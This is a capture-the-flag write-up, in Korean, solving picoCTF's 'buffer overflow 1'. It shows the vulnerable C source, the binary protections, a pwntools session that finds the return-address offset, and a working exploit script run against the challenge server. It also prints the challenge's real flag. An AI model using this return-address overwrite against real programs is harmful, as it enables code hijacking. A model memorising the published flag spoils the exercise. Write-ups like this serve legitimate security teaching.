# [buffer overflow 1](https://play.picoctf.org/practice/challenge/258?category=6&originalEvent=70&page=1)
<br />

**Discription:**
> Control the return address
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/buf_1/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
<br />

> [!NOTE]
> ```bash
> $ cat flag.txt
> pico{this_is_flag}
> ```

<br />
<br />

소스코드를 보면 `gets(buf)`를 사용하는 것을 볼 수 있습니다. 해당 함수는 `"\n"`를 만날때까지 입력을 받으므로, 스택 버퍼오버플로우가 발생합니다. 이 취약점으로 `RET`을 `win`의 주소로 덮어쓰면 풀리는 간단한 문제입니다.

`RET`의 주소를 조작하려면 버퍼를 `RET` 직전까지 채워야합니다. 그러므로 버퍼에서부터 `RET`까지의 오프셋을 구하겠습니다.
```yaml
$ python3 -q
>>> from pwn import *
>>> p = process("./vuln")
[+] Starting local process './vuln': pid 594
>>> p.sendline(cyclic(100))
>>> p.wait()
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 594)
>>> Corefile("./core.594")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/buf_1/core.594'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xffe84000
    Exe:       '/home/kali/pico/buf_1/vuln' (0x8048000)
    Fault:     0x6161616c
Corefile('/home/kali/pico/buf_1/core.594')
>>> cyclic_find(0x6161616c)
44
```
오프셋은 `44` 입니다. 이후 `RET`을 덮어쓰겠습니다.
```yaml
>>> e = ELF("vuln", checksec=False)
>>> p = process("./vuln")
[+] Starting local process './vuln': pid 661
>>> p.sendline(cyclic(44) + p32(e.sym["win"]))
>>> p.interactive()
[*] Switching to interactive mode
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 661)
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
pico{this_is_flag}
[*] Got EOF while reading in interactive
$
```
<br />
<br />

**remote:**
```python
from pwn import *

context.log_level = "error"

e = ELF("./vuln", checksec=False)
# p = e.process()
p = remote("saturn.picoctf.net", 61574)

p.sendline(cyclic(44) + p32(e.sym["win"]))
p.interactive()
```
```bash
$ python3 test.py
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}$
```


